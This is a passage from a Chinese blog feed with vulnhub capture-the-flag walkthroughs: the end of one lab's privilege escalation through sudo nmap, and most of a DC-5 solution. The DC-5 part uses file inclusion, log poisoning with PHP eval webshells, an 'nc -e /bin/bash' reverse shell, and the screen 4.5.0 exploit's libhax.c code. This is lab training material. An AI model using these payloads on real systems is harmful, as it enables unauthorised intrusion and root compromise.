class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106160818161.png" alt="image-20240106160818161"></p><h3 id="5-进行提权"><a href="#5-进行提权" class="headerlink" title="(5)进行提权"></a>(5)进行提权</h3><h4 id="1-尝试suid提权失败"><a href="#1-尝试suid提权失败" class="headerlink" title="1)尝试suid提权失败"></a>1)尝试suid提权失败</h4><p>查找具有suid权限的程序</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span class="token function">find</span> / <span class="token parameter variable">-user</span> root <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-print</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106201514030.png" alt="image-20240106201514030"></p><p>没有发现可以利用的程序，我们换一个思路</p><h4 id="2-查找可执行操作"><a href="#2-查找可执行操作" class="headerlink" title="2)查找可执行操作"></a>2)查找可执行操作</h4><p>执行sudo -l，发现需要www-data的密码</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">sudo -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106202103926.png" alt="image-20240106202103926"></p><p>我们切换到home目录下，可以发现有4个用户名</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106202225676.png" alt="image-20240106202225676"></p><p>我们一个一个进行查看，最后进入到mark用户的家目录下，stuff文件下有一个things-to-do.txt文件，查看文件内容发现graham用户及登录密码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106202618991.png" alt="image-20240106202618991"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106202731250.png" alt="image-20240106202731250"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106202745818.png" alt="image-20240106202745818"></p><p>可以看到有一个stuff文件</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106203025536.png" alt="image-20240106203025536"></p><h4 id="3-切换到graham用户"><a href="#3-切换到graham用户" class="headerlink" title="3)切换到graham用户"></a>3)切换到graham用户</h4><p>我们切换用户为graham，输入密码GSo7isUM1D4</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106203628420.png" alt="image-20240106203628420"></p><h4 id="4-发现jens目录下backups-sh文件"><a href="#4-发现jens目录下backups-sh文件" class="headerlink" title="4)发现jens目录下backups.sh文件"></a>4)发现jens目录下backups.sh文件</h4><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol"><span class="token operator">/</span>home<span class="token operator">/</span>jens<span class="token operator">/</span>backups<span class="token punctuation">.</span>sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106203805466.png" alt="image-20240106203805466"></p><p>查看备份文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /home/jens/backrups.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106204017919.png" alt="image-20240106204017919"></p><p>发现里面是如下命令，是对web的文件进行打包备份</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> <span class="token parameter variable">-czf</span> backups.tar.gz /var/www/html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106204359682.png" alt="image-20240106204359682"></p><h4 id="5-切换到jens-用户"><a href="#5-切换到jens-用户" class="headerlink" title="5)切换到jens 用户"></a>5)切换到jens 用户</h4><p>向backups.sh文件中写入”&#x2F;bin&#x2F;bash”，并以jens用户去执行该脚本</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106204602880.png" alt="image-20240106204602880"></p><p>脚本执行成功后，切换到jens用户</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106204637136.png" alt="image-20240106204637136"></p><h4 id="6-发现jens可在无密码下执行nmap"><a href="#6-发现jens可在无密码下执行nmap" class="headerlink" title="6)发现jens可在无密码下执行nmap"></a>6)发现jens可在无密码下执行nmap</h4><p>再次查看jens可以执行的操作，发现jens可以在无密码情况下使用nmap命令</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106204808230.png" alt="image-20240106204808230"></p><p>可以看到root</p><h4 id="7-提权成功"><a href="#7-提权成功" class="headerlink" title="7)提权成功"></a>7)提权成功</h4><p>百度到可以写入一条命令到getShell，并通过nmap运行getShell成功进入root用户，在&#x2F;root目录下找到theflag.txt文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'os.execute("/bin/sh")'</span> <span class="token operator">></span> getShell<span class="token function">sudo</span>  nmap  <span class="token parameter variable">--script</span><span class="token operator">=</span>getShell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106205045678.png" alt="image-20240106205045678"></p><h4 id="8-发现flag"><a href="#8-发现flag" class="headerlink" title="8)发现flag"></a>8)发现flag</h4><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106205128112.png" alt="image-20240106205128112"></p><h2 id="三-相关资源"><a href="#三-相关资源" class="headerlink" title="三.相关资源"></a>三.相关资源</h2><p>1.靶场下载地址 </p><p>2.nmap </p><p>3.arp-scan </p><p>4.masscan </p><p>5.[ 常用工具篇 ] 渗透神器 whatweb 安装使用详解 </p><p>6.[ 渗透工具篇 ] EHole(棱洞)3.0安装部署及详解（linux &amp; win） </p><p>7.nikto </p><p>8.wpscan </p><p>9.[ 隧道技术 ] 反弹shell的集中常见方式（一）nc反弹shell </p><p>10.[ 常用工具篇 ] burpsuite_pro 安装配置详解（附安装包） </p><p>11.简谈SUID提权 </p><p>12.实现交互式shell的几种方式 </p><p>13.修改hosts文件 </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之DC-5</title>
    <link href="http://ms02423.top/2023/12/25/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BDC-5/"/>
    <id>http://ms02423.top/2023/12/25/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BDC-5/</id>
    <published>2023-12-25T05:58:04.000Z</published>
    <updated>2024-01-06T06:04:47.104Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">DC-5 <span class="token keyword">is</span> another purposely built vulnerable lab <span class="token keyword">with</span> the intent <span class="token keyword">of</span> gaining experience <span class="token keyword">in</span> the world <span class="token keyword">of</span> penetration testing<span class="token punctuation">.</span>The plan was <span class="token keyword">for</span> DC-5 <span class="token keyword">to</span> kick it <span class="token keyword">up</span> a notch<span class="token punctuation">,</span> so this might <span class="token operator">not</span> be great <span class="token keyword">for</span> beginners<span class="token punctuation">,</span> but should be ok <span class="token keyword">for</span> people <span class="token keyword">with</span> intermediate <span class="token operator">or</span> better experience<span class="token punctuation">.</span> <span class="token keyword">Time</span> will tell <span class="token punctuation">(</span><span class="token keyword">as</span> will feedback<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">As</span> far <span class="token keyword">as</span> I am aware<span class="token punctuation">,</span> there <span class="token keyword">is</span> only one exploitable <span class="token keyword">entry</span> point <span class="token keyword">to</span> get <span class="token keyword">in</span> <span class="token punctuation">(</span>there <span class="token keyword">is</span> <span class="token keyword">no</span> SSH either<span class="token punctuation">)</span><span class="token punctuation">.</span> This particular <span class="token keyword">entry</span> point may be quite hard <span class="token keyword">to</span> identify<span class="token punctuation">,</span> but it <span class="token keyword">is</span> there<span class="token punctuation">.</span> You need <span class="token keyword">to</span> look <span class="token keyword">for</span> something a little out <span class="token keyword">of</span> the ordinary <span class="token punctuation">(</span>something that changes <span class="token keyword">with</span> a refresh <span class="token keyword">of</span> a <span class="token keyword">page</span><span class="token punctuation">)</span><span class="token punctuation">.</span> This will hopefully provide some kind <span class="token keyword">of</span> idea <span class="token keyword">as</span> <span class="token keyword">to</span> what the vulnerability might involve<span class="token punctuation">.</span><span class="token operator">And</span> <span class="token keyword">just</span> <span class="token keyword">for</span> the <span class="token keyword">record</span><span class="token punctuation">,</span> there <span class="token keyword">is</span> <span class="token keyword">no</span> phpmailer exploit involved<span class="token punctuation">.</span> <span class="token punctuation">:</span><span class="token operator">-</span><span class="token punctuation">)</span>The ultimate goal <span class="token keyword">of</span> this challenge <span class="token keyword">is</span> <span class="token keyword">to</span> get root <span class="token operator">and</span> <span class="token keyword">to</span> <span class="token keyword">read</span> the one <span class="token operator">and</span> only flag<span class="token punctuation">.</span>Linux skills <span class="token operator">and</span> familiarity <span class="token keyword">with</span> the Linux command <span class="token keyword">line</span> <span class="token keyword">are</span> a must<span class="token punctuation">,</span> <span class="token keyword">as</span> <span class="token keyword">is</span> some experience <span class="token keyword">with</span> basic penetration testing tools<span class="token punctuation">.</span><span class="token keyword">For</span> beginners<span class="token punctuation">,</span> Google can be <span class="token keyword">of</span> great assistance<span class="token punctuation">,</span> but you can always tweet me <span class="token keyword">at</span> @DCAU7 <span class="token keyword">for</span> assistance <span class="token keyword">to</span> get you going again<span class="token punctuation">.</span> But take note<span class="token punctuation">:</span> I wo<span class="token string">n't give you the answer, instead, I'</span>ll give you an idea about how <span class="token keyword">to</span> <span class="token keyword">move</span> forward<span class="token punctuation">.</span>But <span class="token keyword">if</span> you're really<span class="token punctuation">,</span> really stuck<span class="token punctuation">,</span> you can watch this video which shows the <span class="token keyword">first</span> step<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只有一个flag</p><h2 id="2-下载靶场环境"><a href="#2-下载靶场环境" class="headerlink" title="2.下载靶场环境"></a>2.下载靶场环境</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>vulnhub<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token keyword">entry</span><span class="token operator">/</span>dc-5<span class="token punctuation">,</span><span class="token number">314</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下载下来的文件</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225140237807.png" alt="image-20231225140237807"></p><h2 id="3-启动靶场环境"><a href="#3-启动靶场环境" class="headerlink" title="3.启动靶场环境"></a>3.启动靶场环境</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225140411377.png" alt="image-20231225140411377"></p><p>虚拟机开启之后界面如上，我们不知道ip，需要自己探活，网段知道：192.168.52.0&#x2F;24</p><h1 id="二-渗透靶场"><a href="#二-渗透靶场" class="headerlink" title="二.渗透靶场"></a>二.渗透靶场</h1><h2 id="1-目标"><a href="#1-目标" class="headerlink" title="1.目标"></a>1.目标</h2><p>目标就是我们搭建的靶场，靶场IP为：192.168.52.0&#x2F;24</p><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h2><h3 id="1-寻找靶机真实IP"><a href="#1-寻找靶机真实IP" class="headerlink" title="(1)寻找靶机真实IP"></a>(1)寻找靶机真实IP</h3><p>使用nmap进行探活，寻找靶机ip</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">nmap -sP <span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225140707890.png" alt="image-20231225140707890"></p><p>也可以使用arp-scan进行探活，寻找靶机ip</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225140851823.png" alt="image-20231225140851823"></p><p>本机ip为192.168.52.152<br>所以分析可得靶机ip为192.168.52.136</p><h3 id="2-探端口及服务"><a href="#2-探端口及服务" class="headerlink" title="(2)探端口及服务"></a>(2)探端口及服务</h3><p>使用nmap探活端口</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">nmap -A -v -p- <span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.136</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225141324344.png" alt="image-20231225141324344"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">发现开放了<span class="token number">80</span>端口，存在web服务，nginx <span class="token number">1.6</span><span class="token number">.2</span>发现开放了<span class="token number">111</span>端口，rpcbind 2-4发现开放了<span class="token number">58694</span>端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>也可以使用masscan探活端口</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">masscan --rate<span class="token operator">=</span><span class="token number">10000</span> --ports 0-65535 <span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.136</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225141551024.png" alt="image-20231225141551024"></p><h3 id="3-web指纹识别"><a href="#3-web指纹识别" class="headerlink" title="(3)web指纹识别"></a>(3)web指纹识别</h3><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225141800642.png" alt="image-20231225141800642"></p><h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-访问web访问"><a href="#1-访问web访问" class="headerlink" title="(1)访问web访问"></a>(1)访问web访问</h3><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225141852497.png" alt="image-20231225141852497"></p><p>发现有一个留言板，随便输入一下并提交</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225142008963.png" alt="image-20231225142008963"></p><p>提交完成之后发现切入点,页面跳转到Thankyou.php，并且在URL地址栏可以看到参数，GET方式传参</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225142106629.png" alt="image-20231225142106629"></p><p>突然发现这儿变成2018了，之前好像是2019</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225142225101.png" alt="image-20231225142225101"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225142240133.png" alt="image-20231225142240133"></p><p>琢磨琢磨，最后发现，只要一刷新页面，就会变，猜想存在文件包含</p><h3 id="2-bp是否存在文件包"><a href="#2-bp是否存在文件包" class="headerlink" title="(2)bp是否存在文件包"></a>(2)bp是否存在文件包</h3><p>使用BurpSuite抓包，爆破后台页面，由于是php站，我们选择php字典</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225142954512.png" alt="image-20231225142954512"></p><p>导入一个php字典，进行爆破</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225143207510.png" alt="image-20231225143207510"></p><p>发现存在index.php，solutions.php，about-us.php，faq.php，contact.php，thankyou.php，footer.php七个页面</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225144602625.png" alt="image-20231225144602625"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225144449486.png" alt="image-20231225144449486"></p><p>打开这几个页面，发现发开footer.php时，不断刷新，图标也在不断地变化，确认文件包含页面是footer.php</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225144652807.png" alt="image-20231225144652807"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225144708976.png" alt="image-20231225144708976"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225144730198.png" alt="image-20231225144730198"></p><h3 id="3-Fuzz确认存在文件包含漏洞"><a href="#3-Fuzz确认存在文件包含漏洞" class="headerlink" title="(3)Fuzz确认存在文件包含漏洞"></a>(3)Fuzz确认存在文件包含漏洞</h3><p>使用BurpSuite爆破文件包含的变量名即可能被包含的值</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.136</span><span class="token operator">/</span>thankyou<span class="token punctuation">.</span>php?<span class="token keyword">page</span><span class="token operator">=</span>footer<span class="token punctuation">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>选择草叉模式进行爆破，选择两个爆破点，一个是文件包含变量名，一个是包含值</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105152459936.png" alt="image-20240105152459936"></p><p>导入第一个字典，变量名字典</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105152539472.png" alt="image-20240105152539472"></p><p>导入第二个字典（passwd路径字典）</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105152615556.png" alt="image-20240105152615556"></p><p>成功爆破出八对值，但是只有一个变量名</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105152650601.png" alt="image-20240105152650601"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol"><span class="token operator">/</span>thankyou<span class="token punctuation">.</span>php?<span class="token keyword">file</span><span class="token operator">=</span>%2e%2e%2fetc%2fpasswd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>访问最短的吧路径，成功包含到字典</p><p><a href="http://192.168.52.136/thankyou.php?file=/etc/passwd">http://192.168.52.136/thankyou.php?file=%2fetc%2fpasswd</a> </p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105152834883.png" alt="image-20240105152834883"></p><p><a href="http://192.168.52.136/thankyou.php?file=/etc/passwd">http://192.168.52.136/thankyou.php?file=/etc/passwd</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105152905401.png" alt="image-20240105152905401"></p><h3 id="4-确认日志文件的位置"><a href="#4-确认日志文件的位置" class="headerlink" title="(4)确认日志文件的位置"></a>(4)确认日志文件的位置</h3><p>由于前面信息收集我们确认了是nginx的站，访问日志和错误日志应该如下<br><a href="https://blog.csdn.net/qq_36119192/article/details/102956230">Web日志目录及日志分析</a></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol"><span class="token operator">/</span>var<span class="token operator">/</span>log<span class="token operator">/</span>nginx<span class="token operator">/</span><span class="token keyword">access</span><span class="token punctuation">.</span>log<span class="token operator">/</span>var<span class="token operator">/</span>log<span class="token operator">/</span>nginx<span class="token operator">/</span><span class="token keyword">error</span><span class="token punctuation">.</span>log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>包含看一下</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105153221281.png" alt="image-20240105153221281"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105153250716.png" alt="image-20240105153250716"></p><h3 id="5-写入一句话木马"><a href="#5-写入一句话木马" class="headerlink" title="(5)写入一句话木马"></a>(5)写入一句话木马</h3><h4 id="1-写入phpinfo"><a href="#1-写入phpinfo" class="headerlink" title="1)写入phpinfo"></a>1)写入phpinfo</h4><p>写入phpinfo,访问如下日志文件，使用burpsuite抓包</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105153616786.png" alt="image-20240105153616786"></p><p>我们使用burp进行抓包，在burp中写入一句话木马</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">GET <span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span>;?<span class="token operator">></span> HTTP<span class="token operator">/</span><span class="token number">1.1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>没有写入之前</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105153818491.png" alt="image-20240105153818491"></p><p>写入之后</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105153949605.png" alt="image-20240105153949605"></p><p>重新打开日志文件可以看到成功写入，成功回显出phpinfo信息</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105154051732.png" alt="image-20240105154051732"></p><h4 id="2-写入webshell"><a href="#2-写入webshell" class="headerlink" title="2)写入webshell"></a>2)写入webshell</h4><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol"><span class="token operator">&lt;</span>?php @eval<span class="token punctuation">(</span>$_POST[<span class="token string">'ms02423'</span>]<span class="token punctuation">)</span>;?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>由于一些原因，靶机ip地址由192.168.52.136变成了192.168.52.128</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105194739666.png" alt="image-20240105194739666"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105194755495.png" alt="image-20240105194755495"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105194924650.png" alt="image-20240105194924650"></p><p>IP地址192.168.52.128</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105195240841.png" alt="image-20240105195240841"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105195259596.png" alt="image-20240105195259596"></p><p>3)连接蚁剑</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105195327992.png" alt="image-20240105195327992"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105195340657.png" alt="image-20240105195340657"></p><h4 id="3-新建shell文件"><a href="#3-新建shell文件" class="headerlink" title="3)新建shell文件"></a>3)新建shell文件</h4><p>可以在服务器&#x2F;tmp目录下新建一个webshell.php文件，写入一句话木马并重新连接</p><p>右键在tmp目录下新建php文件，名称为webshell.php</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105195728613.png" alt="image-20240105195728613"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">欢迎访问webshell页面!!! <span class="token operator">&lt;</span>?php @eval<span class="token punctuation">(</span>$_REQUEST[powershell]<span class="token punctuation">)</span> ?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105195937931.png" alt="image-20240105195937931"></p><h4 id="4-我们访问新的页面"><a href="#4-我们访问新的页面" class="headerlink" title="4)我们访问新的页面"></a>4)我们访问新的页面</h4><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105200153964.png" alt="image-20240105200153964"></p><h4 id="5-蚁剑连接新的webshell"><a href="#5-蚁剑连接新的webshell" class="headerlink" title="5)蚁剑连接新的webshell"></a>5)蚁剑连接新的webshell</h4><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105200328616.png" alt="image-20240105200328616"></p><p>连接成功右键进入虚拟终端</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105200452842.png" alt="image-20240105200452842"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105200511440.png" alt="image-20240105200511440"></p><h3 id="6-反弹shell到kali"><a href="#6-反弹shell到kali" class="headerlink" title="(6)反弹shell到kali"></a>(6)反弹shell到kali</h3><p>蚁剑终端不如kali终端，我们反弹shell到kali(这里我没有成功，不知道什么原因)</p><p>我们在kali里面终端输入</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">nc -lnvp <span class="token number">666666</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们在蚁剑虚拟终端输入</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">nc -e <span class="token operator">/</span>bin<span class="token operator">/</span>bash <span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.128</span> <span class="token number">666666</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="4-suid提权"><a href="#4-suid提权" class="headerlink" title="4.suid提权"></a>4.suid提权</h2><p>使用find命令，查找具有suid权限的命令</p><h3 id="1-发现screen-4-5-0"><a href="#1-发现screen-4-5-0" class="headerlink" title="(1)发现screen-4.5.0"></a>(1)发现screen-4.5.0</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">发现screen-4<span class="token punctuation">.</span><span class="token number">5.0</span>，使用<span class="token number">41145</span><span class="token punctuation">.</span>sh脚本提权GNU <span class="token keyword">Screen</span>是一款由GNU计划开发的用于命令行终端切换的自由软件。用户可以通过该软件同时连接多个本地或远程的命令行会话，并在其间自由切换。GNU <span class="token keyword">Screen</span>可以看作是窗口管理器的命令行界面版本。它提供了统一的管理多个会话的界面和相应的功能。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>下面两条命令都行</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">find <span class="token operator">/</span> -user root -perm <span class="token number">-4000</span> -print <span class="token number">2</span><span class="token operator">></span><span class="token operator">/</span>dev<span class="token operator">/</span><span class="token keyword">null</span> find <span class="token operator">/</span> -perm -u<span class="token operator">=</span>s -type f <span class="token number">2</span><span class="token operator">></span><span class="token operator">/</span>dev<span class="token operator">/</span><span class="token keyword">null</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105220511216.png" alt="image-20240105220511216"></p><h3 id="2-查找screen-4-5-0漏洞脚本文件"><a href="#2-查找screen-4-5-0漏洞脚本文件" class="headerlink" title="(2)查找screen 4.5.0漏洞脚本文件"></a>(2)查找screen 4.5.0漏洞脚本文件</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">searchsploit <span class="token keyword">screen</span> <span class="token number">4.5</span><span class="token number">.0</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105220707539.png" alt="image-20240105220707539"></p><p>我们发现有两个发现screen 4.5.0 存在本地特权提升的漏洞，我们利用第一个，将脚本复制到本目录下</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">cp <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>exploitdb<span class="token operator">/</span>exploits<span class="token operator">/</span>linux<span class="token operator">/</span><span class="token keyword">local</span><span class="token operator">/</span><span class="token number">41154</span><span class="token punctuation">.</span>sh <span class="token punctuation">.</span><span class="token operator">/</span><span class="token number">41154</span><span class="token punctuation">.</span>sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105220909464.png" alt="image-20240105220909464"></p><h3 id="3-查看cat-41154-sh脚本文件"><a href="#3-查看cat-41154-sh脚本文件" class="headerlink" title="(3)查看cat 41154.sh脚本文件"></a>(3)查看cat 41154.sh脚本文件</h3><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105221117944.png" alt="image-20240105221117944"></p><p>由于终端看的不全，我们在kali里面进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105221228736.png" alt="image-20240105221228736"></p><h3 id="4-将第一部分内容写到libhax-c并编译"><a href="#4-将第一部分内容写到libhax-c并编译" class="headerlink" title="(4)将第一部分内容写到libhax.c并编译"></a>(4)将第一部分内容写到libhax.c并编译</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">按照脚本提示，先将第一部分内容写到libhax<span class="token punctuation">.</span>c中<span class="token punctuation">(</span>一共有三个部分<span class="token punctuation">)</span>创建一个文件夹存放三个部分的脚本<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105221605803.png" alt="image-20240105221605803"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">创建libhax<span class="token punctuation">.</span>c文件，用vim编辑，当然，也可以直接使用vim创建文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105221749403.png" alt="image-20240105221749403"></p><p>写入如下文件</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>__constructor__<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">void</span> <span class="token function">dropshell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">chown</span><span class="token punctuation">(</span><span class="token string">"/tmp/rootshell"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">chmod</span><span 